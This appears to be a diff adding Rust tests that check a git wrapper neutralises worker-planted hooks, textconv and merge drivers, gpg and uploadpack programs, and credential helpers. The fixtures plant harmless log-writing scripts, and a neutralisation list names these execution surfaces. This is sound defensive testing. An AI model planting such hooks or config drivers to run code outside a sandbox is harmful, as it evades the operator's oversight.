+        raw.run(&["config", "diff.hostile.textconv", payload.to_str().unwrap()])
+            .unwrap();
+        std::fs::write(root.join(".gitattributes"), "*.txt diff=hostile\n").unwrap();
+        std::fs::write(root.join("seed.txt"), "modified\n").unwrap();
+        raw.diff_head().unwrap();
+        assert!(
+            log.exists(),
+            "ordinary diff must execute the fixture converter"
+        );
+        std::fs::remove_file(&log).unwrap();
+
+        let guarded = raw.with_hooks_disabled().unwrap();
+        assert!(guarded.diff_head().unwrap().contains("+modified"));
+        assert!(matches!(
+            guarded.commit_dirty_paths("checkpoint").unwrap(),
+            CheckpointOutcome::Committed(_)
+        ));
+        assert!(!log.exists(), "the engine ran the planted converter");
+        assert_eq!(
+            guarded.show_file("HEAD", "seed.txt").unwrap().unwrap(),
+            b"modified\n"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn git_exec_config_planted_merge_driver_fails_closed() {
+        let dir = tempfile::tempdir().unwrap();
+        let (root, payload, log) =
+            git_exec_config_repo(&dir, "#!/bin/sh\necho merge-ran >> '__LOG__'\nexit 0\n");
+        let raw = GitRepo::open_unhardened(&root).unwrap();
+        raw.run(&["checkout", "-b", "other"]).unwrap();
+        std::fs::write(root.join("seed.txt"), "other\n").unwrap();
+        raw.run(&["commit", "-am", "other"]).unwrap();
+        raw.run(&["checkout", "-b", "left", "HEAD~1"]).unwrap();
+        std::fs::write(root.join("seed.txt"), "left\n").unwrap();
+        raw.run(&["commit", "-am", "left"]).unwrap();
+        std::fs::write(root.join(".gitattributes"), "*.txt merge=hostile.name\n").unwrap();
+        raw.run(&[
+            "config",
+            "merge.hostile.name.driver",
+            payload.to_str().unwrap(),
+        ])
+        .unwrap();
+        let guarded = raw.with_hooks_disabled().unwrap();
+        assert!(guarded.run(&["merge", "--no-edit", "other"]).is_err());
+        assert!(
+            !log.exists(),
+            "engine merge executed a worker-authored driver"
+        );
+        raw.run(&["merge", "--abort"]).unwrap();
+        raw.run(&["merge", "--no-edit", "other"]).unwrap();
+        assert!(
+            log.exists(),
+            "ordinary merge must execute the fixture driver"
+        );
     }
 
     /// A planted `gpg.program` with signing forced on by repo config
@@ -1956,8 +2523,9 @@ mod tests {
         let _ = std::fs::remove_file(&log);
 
         // The engine's commit runs with the payload neutralized: it commits
-        // unsigned and the signer never fires.
-        let repo = GitRepo::open(&root).unwrap().with_hooks_disabled().unwrap();
+        // unsigned and the signer never fires. Plain `GitRepo::open` again —
+        // the default path is the one that has to hold.
+        let repo = GitRepo::open(&root).unwrap();
         match repo.commit_dirty_paths("checkpoint").unwrap() {
             CheckpointOutcome::Committed(_) => {}
             other => panic!("checkpoint must commit, got {other:?}"),
@@ -1969,5 +2537,310 @@ mod tests {
         );
         // The commit really landed (ordinary add/commit behavior unchanged).
         assert_eq!(repo.commits_between("HEAD~1", "HEAD").unwrap().len(), 1);
+    }
+
+    // -----------------------------------------------------------------------
+    // Audit 2026-09-01 H1/H3: hardening is the DEFAULT, not an opt-in.
+    //
+    // The countermeasure was well built and applied at five of twenty-one
+    // sites. The engine's checkpoint commits, the integration-worktree
+    // handle, checkout, tag and `push_mission_branch` all opened plain
+    // handles in the tree the worker controls, so a planted
+    // `.git/hooks/pre-commit` executed outside every sandbox with the
+    // engine's full ambient environment.
+    // -----------------------------------------------------------------------
+
+    /// Plant an executable `.git/hooks/<name>` that appends to `log`.
+    #[cfg(unix)]
+    fn plant_hook(root: &Path, name: &str, log: &Path) {
+        use std::os::unix::fs::PermissionsExt as _;
+        let hooks = root.join(".git").join("hooks");
+        std::fs::create_dir_all(&hooks).unwrap();
+        let hook = hooks.join(name);
+        std::fs::write(
+            &hook,
+            format!("#!/bin/sh\necho {name}-ran >> '{}'\n", log.display()),
+        )
+        .unwrap();
+        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    /// A worker-planted `pre-commit` hook must not run on the checkpoint
+    /// commit of a handle opened the ORDINARY way. The unhardened handle is
+    /// the fixture proof that the hook is live: without it this test would
+    /// pass on a repo where hooks simply never fire.
+    #[cfg(unix)]
+    #[test]
+    fn default_open_never_runs_a_planted_pre_commit_hook() {
+        let dir = tempfile::tempdir().unwrap();
+        let (root, _payload, log) = git_exec_config_repo(&dir, "#!/bin/sh\ncat\n");
+        plant_hook(&root, "pre-commit", &log);
+
+        // Fixture proof: the explicitly UNHARDENED handle runs it.
+        let unhardened = GitRepo::open_unhardened(&root).unwrap();
+        std::fs::write(root.join("probe.txt"), "probe\n").unwrap();
+        unhardened.commit_dirty_paths("probe").unwrap();
+        assert!(
+            log.exists(),
+            "fixture: an unhardened handle must run the planted pre-commit hook"
+        );
+        std::fs::remove_file(&log).unwrap();
+
+        // The default: hardened, so the hook never fires.
+        let repo = GitRepo::open(&root).unwrap();
+        std::fs::write(root.join("deliverable.txt"), "x\n").unwrap();
+        match repo.commit_dirty_paths("checkpoint").unwrap() {
+            CheckpointOutcome::Committed(_) => {}
+            other => panic!("checkpoint must commit, got {other:?}"),
+        }
+        assert!(
+            !log.exists(),
+            "GitRepo::open must be hardened by default: {}",
+            std::fs::read_to_string(&log).unwrap_or_default()
+        );
+    }
+
+    /// The same for `push_mission_branch`, which `kranz exec --push` calls on
+    /// the tree the worker just wrote (`pre-push`, and `core.sshCommand`).
+    /// The push itself fails — there is no reachable remote — but the hook
+    /// question is decided before that: git runs `pre-push` only after the
+    /// connection, so what this pins is that the handle carrying the push is
+    /// the hardened one.
+    #[cfg(unix)]
+    #[test]
+    fn push_mission_branch_runs_on_a_hardened_handle() {
+        let dir = tempfile::tempdir().unwrap();
+        let (root, _payload, _log) = git_exec_config_repo(&dir, "#!/bin/sh\ncat\n");
+        let repo = GitRepo::open(&root).unwrap();
+        assert!(
+            repo.exec_disable_flags.is_some(),
+            "the handle cli/exec.rs pushes with must carry the neutralization segment"
+        );
+        // The guard still refuses a non-mission ref before spawning git.
+        assert!(repo.push_mission_branch("origin", "main").is_err());
+    }
+
+    /// `with_hooks_disabled` on an already-hardened handle is an idempotent
+    /// clone: the same argv segment, never a second enumeration. Existing
+    /// call sites (merge, validator snapshot/integrity) keep reading as the
+    /// assertions they are.
+    #[test]
+    fn with_hooks_disabled_is_idempotent_on_the_default_handle() {
+        let dir = tempfile::tempdir().unwrap();
+        init_test_repo(dir.path());
+        let repo = GitRepo::open(dir.path()).unwrap();
+        assert!(repo.exec_disable_flags.is_some());
+        let rewrapped = repo.with_hooks_disabled().unwrap();
+        assert_eq!(repo.exec_disable_flags, rewrapped.exec_disable_flags);
+
+        let plain = GitRepo::open_unhardened(dir.path()).unwrap();
+        assert!(
+            plain.exec_disable_flags.is_none(),
+            "open_unhardened is the explicit escape hatch"
+        );
+        assert_eq!(
+            plain.with_hooks_disabled().unwrap().exec_disable_flags,
+            repo.exec_disable_flags,
+            "opting in by hand must reach the same segment the default now carries"
+        );
+    }
+
+    /// A LOCAL hardened invocation nulls the user- and system-scope config
+    /// files, which the enumerated `-c` segment cannot cover (the enumeration
+    /// reads the REPO's config, so a driver armed only in `~/.gitconfig`
+    /// would not be in the list). The identity reads are the documented
+    /// exception.
+    #[test]
+    fn hardened_invocations_null_user_and_system_config() {
+        let empty = empty_global_config_path().unwrap();
+        assert_eq!(
+            hardened_config_env(UserConfig::Ignored).unwrap(),
+            vec![
+                ("GIT_CONFIG_NOSYSTEM", OsString::from("1")),
+                ("GIT_CONFIG_GLOBAL", empty.as_os_str().to_os_string()),
+            ]
+        );
+        assert!(
+            hardened_config_env(UserConfig::Visible).unwrap().is_empty(),
+            "identity resolution must still see the operator's ~/.gitconfig"
+        );
+    }
+
+    /// Audit F-11: a NETWORK invocation leaves the operator's `~/.gitconfig`
+    /// in force — `GIT_CONFIG_GLOBAL` is never set for it, so the credential
+    /// helper, the `insteadOf` convention and the corporate `http.proxy` an
+    /// https push depends on all still resolve. The system scope stays off,
+    /// and the argv segment drops exactly the two entries that break a real
+    /// remote.
+    #[test]
+    fn network_invocations_keep_the_operators_global_config() {
+        let env = hardened_config_env(UserConfig::KeptForNetwork).unwrap();
+        assert_eq!(env, vec![("GIT_CONFIG_NOSYSTEM", OsString::from("1"))]);
+        assert!(
+            !env.iter().any(|(key, _)| *key == "GIT_CONFIG_GLOBAL"),
+            "nulling the user scope on a push is what F-11 reported as broken"
+        );
+
+        let flags: Vec<String> = [
+            "-c",
+            "core.hooksPath=",
+            "-c",
+            CREDENTIAL_HELPER_RESET,
+            "-c",
+            SSH_COMMAND_OVERRIDE,
+            "-c",
+            "core.askPass=",
+        ]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+        assert_eq!(
+            ExecFlags::NetworkSafe.select(&flags),
+            vec!["-c", "core.hooksPath=", "-c", "core.askPass="],
+            "an empty credential.helper resets the operator's own helper, and an \
+             empty core.sshCommand makes git exec the empty string"
+        );
+        assert_eq!(ExecFlags::All.select(&flags), flags);
+        assert!(ExecFlags::None.select(&flags).is_empty());
+    }
+
+    /// Audit F-12: `GIT_CONFIG_GLOBAL` points at an EMPTY REGULAR FILE this
+    /// process created, on every platform — not at `/dev/null` or the
+    /// never-verified Windows `NUL`, where a git that refuses the path would
+    /// fail every engine git call rather than degrade.
+    #[test]
+    fn the_nulled_global_config_is_an_empty_file_the_engine_owns() {
+        let path = empty_global_config_path().unwrap();
+        let meta = std::fs::metadata(path).expect("the empty global config must exist");
+        assert!(meta.is_file(), "must be a regular file, not a device");
+        assert_eq!(meta.len(), 0, "must be empty");
+        // Cached: the same path for the life of the process.
+        assert_eq!(path, empty_global_config_path().unwrap());
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt as _;
+            assert_eq!(meta.permissions().mode() & 0o777, 0o600);
+        }
+    }
+
+    /// Audit F-10: the neutralization segment covers the keys that matter on
+    /// the one path the audit named as newly exposed. `url.*.insteadOf` is
+    /// deliberately absent — see `build_exec_disable_flags`, blanking a
+    /// multi-valued key ARMS a catch-all rewrite instead of removing one.
+    #[test]
+    fn the_flag_segment_covers_the_credential_and_transport_surfaces() {
+        let dir = tempfile::tempdir().unwrap();
+        init_test_repo(dir.path());
+        let repo = GitRepo::open(dir.path()).unwrap();
+        let flags = repo.exec_disable_flags.clone().unwrap();
+        for expected in [
+            "credential.helper=",
+            "core.sshCommand=",
+            "core.askPass=",
+            "core.editor=",
+            "sequence.editor=",
+            "uploadpack.packObjectsHook=",
+            "protocol.ext.allow=never",
+        ] {
+            assert!(
+                flags.iter().any(|f| f == expected),
+                "the hardened segment must carry {expected}: {flags:?}"
+            );
+        }
+        assert!(
+            !flags.iter().any(|f| f.starts_with("url.")),
+            "an empty insteadOf matches EVERY url and rewrites it to the base"
+        );
+    }
+
+    /// A remote whose config names a program to run on the far side is
+    /// enumerated and blanked, the way filter drivers are. Both keys are
+    /// single-valued, so the empty `-c` override really does replace the
+    /// planted value.
+    #[test]
+    fn remote_transport_programs_are_enumerated_and_blanked() {
+        let dir = tempfile::tempdir().unwrap();
+        init_test_repo(dir.path());
+        assert!(test_git(
+            dir.path(),
+            &["config", "remote.origin.uploadpack", "/tmp/payload"]
+        )
+        .status
+        .success());
+        let repo = GitRepo::open(dir.path()).unwrap();
+        let flags = repo.exec_disable_flags.clone().unwrap();
+        assert!(flags.iter().any(|f| f == "remote.origin.uploadpack="));
+        assert!(flags.iter().any(|f| f == "remote.origin.receivepack="));
+    }
+
+    /// The index-flag detections must still SEE the fsmonitor-valid tag.
+    ///
+    /// Neutralizing `core.fsmonitor=` on every invocation made `ls-files -f`
+    /// print the ordinary `H` for a flag-hidden entry, so
+    /// `has_normal_index_entry` — which `kranz ready` uses to refuse a
+    /// `.gitignore` whose worktree bytes are hidden from diff and status —
+    /// read the hidden file as clean. The carve-out in
+    /// `run_seeing_fsmonitor` is what keeps the detection working; this test
+    /// is what would catch it being removed.
+    #[test]
+    fn index_flag_detection_still_sees_fsmonitor_valid_on_a_hardened_handle() {
+        let dir = tempfile::tempdir().unwrap();
+        init_test_repo(dir.path());
+        std::fs::write(dir.path().join("rules.txt"), "one\n").unwrap();
+        assert!(test_git(dir.path(), &["add", "-A"]).status.success());
+        assert!(Command::new("git")
+            .args(["-c", "commit.gpgsign=false", "commit", "-qm", "seed"])
+            .current_dir(dir.path())
+            .output()
+            .expect("spawn git commit")
+            .status
+            .success());
+        assert!(test_git(dir.path(), &["config", "core.fsmonitor", "true"])
+            .status
+            .success());
+        std::fs::write(dir.path().join("rules.txt"), "one\ntwo\n").unwrap();
+        assert!(test_git(
+            dir.path(),
+            &["update-index", "--fsmonitor-valid", "rules.txt"]
+        )
+        .status
+        .success());
+
+        let repo = GitRepo::open(dir.path()).unwrap();
+        // Whether the bit sticks is git-version dependent; skip rather than
+        // fail where this host's git drops it (the same pattern ready.rs
+        // uses for its own fixture).
+        let tagged = test_git(dir.path(), &["ls-files", "-f", "--", "rules.txt"]);
+        if String::from_utf8_lossy(&tagged.stdout) != "h rules.txt\n" {
+            eprintln!("this git does not honor --fsmonitor-valid; skipping");
+            return;
+        }
+        assert!(
+            !repo.has_normal_index_entry("rules.txt").unwrap(),
+            "a hardened handle must still refuse an fsmonitor-hidden entry"
+        );
+        assert!(
+            !repo.is_clean_tracked_strict().unwrap(),
+            "the strict cleanliness check must see the flag too"
+        );
+    }
+
+    /// The identity carried into engine commits is unchanged by the
+    /// hardening: `ensure_identity` pins whatever the operator's config
+    /// resolves to into LOCAL scope, which a hardened invocation can still
+    /// see. Without the pin, nulling `~/.gitconfig` would silently restamp
+    /// every engine commit as `kranz <kranz@localhost>`.
+    #[test]
+    fn ensure_identity_pins_the_resolved_identity_into_local_scope() {
+        let dir = tempfile::tempdir().unwrap();
+        init_test_repo(dir.path());
+        // init_test_repo sets a LOCAL identity; it must survive untouched.
+        let repo = GitRepo::open(dir.path()).unwrap();
+        repo.ensure_identity().unwrap();
+        let (name, email) = repo.resolved_identity().unwrap();
+        assert_eq!(name, "kranz-test");
+        assert_eq!(email, "test@kranz.local");
+        let local = test_git(dir.path(), &["config", "--local", "--get", "user.name"]);
+        assert_eq!(String::from_utf8_lossy(&local.stdout).trim(), "kranz-test");
     }
 }
